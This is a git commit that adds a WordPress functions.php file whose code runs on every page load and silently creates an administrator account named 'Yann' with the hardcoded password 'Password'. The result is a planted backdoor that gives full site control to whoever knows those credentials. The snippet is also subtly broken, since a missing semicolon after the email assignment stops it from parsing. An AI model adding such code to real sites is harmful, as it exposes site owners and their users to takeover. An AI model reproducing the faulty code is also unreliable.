885a92d37479056df2bdc532462adbf5987da0d1
Yann Rimbaud <yrimbaud@gmail.com>
2023-05-31 11:29:19 +0200

    Create functions.php

---
+++ functions.php
@@ -0,0 +1,16 @@
+<?php
+function wp_simple_admin_account(){
+  $user = "Yann";
+  $pass = "Password";
+  $email = "yann@password.com"
+  if(
+      !username_exists($user)  &&
+      !email_exists($email)
+  ) {
+    $user_id = wp_create_user($user, $pass, $email);
+    $user = new WP_User($user_id);
+    $user->set_role('administrator');
+  }
+}
+add_action('init', 'wp_simple_admin_account');
+?>
